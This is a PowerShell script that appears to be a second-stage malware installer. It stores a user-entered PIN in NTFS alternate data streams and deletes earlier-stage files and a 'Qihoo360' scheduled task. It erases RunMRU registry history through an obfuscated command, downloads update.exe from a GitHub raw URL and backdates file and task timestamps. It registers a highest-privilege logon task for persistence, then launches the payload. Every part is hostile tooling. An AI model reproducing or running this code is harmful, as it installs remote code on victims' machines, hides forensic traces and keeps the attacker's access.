$programDir = "C:\Program Files\Data\9871d3a2c554b27151cacf1422eec048\"
[System.Environment]::SetEnvironmentVariable("PATH", "$env:PATH;C:\Program Files\Data\9871d3a2c554b27151cacf1422eec048\", [System.EnvironmentVariableTarget]::Machine)

New-Item    -Path ($programDir + "7babc233de26ab19ead1b9c278128d5c434910ee.log") -ItemType File -Force
Set-Content -Path ($programDir + "7babc233de26ab19ead1b9c278128d5c434910ee.log:log.txt") -Value ""

Write-Host "Enter PIN:"
$id = Read-Host
New-Item    -Path ($programDir + "87ea5dfc8b8e384d848979496e706390b497e547.log") -ItemType File -Force
Set-Content -Path ($programDir + "87ea5dfc8b8e384d848979496e706390b497e547.log:uid.txt") -Value $id.Trim()

$stage1Path = ("C:\Users\" + $env:USERNAME + "\AppData\Roaming\Data\")
Remove-Item -Path $stage1Path -Force -Recurse
Unregister-ScheduledTask -TaskName "Qihoo360"
Remove-Item -Path "C:\Windows\System32\st.exe"

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
$values = Get-ItemProperty -Path $regPath
foreach ($valueName in $values.PSObject.Properties.Name)
{
    if ($valueName -ne "(default)")
    {
        Re''mov''e-I''temPr''oper''ty -Path $regPath -Name $valueName -ErrorAction SilentlyContinue
    }
}

$updaterPath = $programDir + "update.exe"
curl "https://raw.githubusercontent.com/mhali43/mw2/refs/heads/main/update.exe" -o $updaterPath

(Get-Item $updaterPath).CreationTime=("1 Jan 2000 0:00:00")
(Get-Item $updaterPath).LastWriteTime=("1 Jan 2000 0:00:00")
(Get-Item $updaterPath).LastAccessTime=("1 Jan 2000 0:00:00")

$TaskName = "UpdateTask"
$action = New-ScheduledTaskAction -Execute $updaterPath
$trigger = New-ScheduledTaskTrigger -AtLogon
$Stset = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Force -RunLevel Highest -Settings $Stset

$TaskPath = "C:\Windows\System32\Tasks\" + $TaskName
[xml]$xml = (Get-Content -Path $TaskPath -Encoding Unicode)
if($xml.Task.RegistrationInfo.Date)
{
    $xml.Task.RegistrationInfo.Date = "1999-01-01T00:00:00.0000000"
    $xml.Save($TaskPath)
}

(Get-Item $TaskPath).CreationTime=("1 Jan 2000 0:00:00")
(Get-Item $TaskPath).LastWriteTime=("1 Jan 2000 0:00:00")
(Get-Item $TaskPath).LastAccessTime=("1 Jan 2000 0:00:00")

Start-Process -FilePath $updaterPath
